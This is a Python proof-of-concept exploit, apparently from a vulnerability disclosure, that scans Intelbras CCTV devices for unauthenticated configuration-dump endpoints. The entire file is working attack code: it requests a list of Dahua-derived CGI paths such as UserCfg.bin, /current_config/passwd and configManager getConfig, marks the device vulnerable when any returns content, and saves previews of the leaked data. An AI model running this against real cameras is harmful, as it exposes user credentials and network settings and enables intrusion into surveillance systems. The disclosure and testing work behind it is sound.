#!/usr/bin/env python3
"""PoC INTELBRAS-2026-005: Unauthenticated Configuration Dump.

Extends the PVIP 1000 config disclosure exploit to all Intelbras CCTV models.
Probes multiple Dahua-derived CGI endpoints for unauthenticated configuration
backup access.

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
Date: 2026-04-18
CVSS: 7.5 HIGH — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
CWE: CWE-306 (Missing Authentication for Critical Function)
"""

import os
import sys
import json
from pathlib import Path
from datetime import datetime, timezone

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


EVIDENCE_DIR = Path(__file__).parent / ".." / "evidence"

CONFIG_ENDPOINTS = [
    "/cgi-bin/DownloadCfg/NetworkCfg.bin",
    "/cgi-bin/DownloadCfg/SystemCfg.bin",
    "/cgi-bin/DownloadCfg/UserCfg.bin",
    "/cgi-bin/DownloadCfg/",
    "/cgi-bin/config/getconfig.cgi",
    "/cgi-bin/Config/export",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Network",
    "/cgi-bin/configManager.cgi?action=getConfig&name=All",
    "/current_config/passwd",
    "/system.cfg",
    "/config.dat",
    "/cgi-bin/snapshot.cgi",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
}


def probe_target(ip: str, port: int = 80, timeout: int = 10) -> dict:
    if not HAS_REQUESTS:
        print("[!] requests library required. Install: pip install requests")
        sys.exit(1)

    result = {
        "target": f"{ip}:{port}",
        "scan_date": datetime.now(timezone.utc).isoformat(),
        "endpoints_tested": len(CONFIG_ENDPOINTS),
        "vulnerable_endpoints": [],
        "all_results": [],
        "is_vulnerable": False,
    }

    base_url = f"http://{ip}:{port}"

    for path in CONFIG_ENDPOINTS:
        url = base_url + path
        entry = {
            "path": path,
            "status": None,
            "content_length": 0,
            "content_type": None,
            "accessible": False,
        }

        try:
            resp = requests.get(
                url, headers=HEADERS, timeout=timeout,
                allow_redirects=False, verify=False,
            )
            entry["status"] = resp.status_code
            entry["content_length"] = len(resp.content)
            entry["content_type"] = resp.headers.get("Content-Type", "")

            if resp.status_code == 200 and len(resp.content) > 50:
                entry["accessible"] = True
                result["vulnerable_endpoints"].append(path)
                result["is_vulnerable"] = True
                preview = resp.text[:200].replace("\x00", ".") if resp.text else ""
                entry["preview"] = preview
                print(f"  [+] ACCESSIBLE: {path} ({len(resp.content)} bytes)")
            else:
                print(f"  [-] {path} — HTTP {resp.status_code}")

        except requests.exceptions.ConnectionError:
            entry["status"] = "CONNECTION_REFUSED"
            print(f"  [!] {path} — Connection refused")
        except requests.exceptions.Timeout:
            entry["status"] = "TIMEOUT"
            print(f"  [!] {path} — Timeout")
        except Exception as e:
            entry["status"] = f"ERROR: {e}"
            print(f"  [!] {path} — {e}")

        result["all_results"].append(entry)

    return result


def main():
    if len(sys.argv) < 2:
        print("Usage: python poc_005_config_disclosure.py <target_ip> [port]")
        print("       python poc_005_config_disclosure.py 192.168.1.100")
        print("       python poc_005_config_disclosure.py 192.168.1.100 8080")
        print()
        print("Probes Intelbras CCTV devices for unauthenticated config dump")
        print(f"endpoints ({len(CONFIG_ENDPOINTS)} paths tested).")
        sys.exit(0)

    target_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

    print(f"[*] Probing {target_ip}:{port} for config disclosure endpoints...")
    print(f"[*] Testing {len(CONFIG_ENDPOINTS)} Dahua-derived CGI paths")
    print()

    result = probe_target(target_ip, port)

    print(f"\n{'='*60}")
    if result["is_vulnerable"]:
        print(f"[+] TARGET IS VULNERABLE — {len(result['vulnerable_endpoints'])} "
              f"endpoint(s) accessible without authentication")
        for ep in result["vulnerable_endpoints"]:
            print(f"    {ep}")
    else:
        print("[-] No unauthenticated config endpoints found")

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    out_path = EVIDENCE_DIR / "poc_005_results.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(result, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Results saved to {out_path}")


if __name__ == "__main__":
    main()
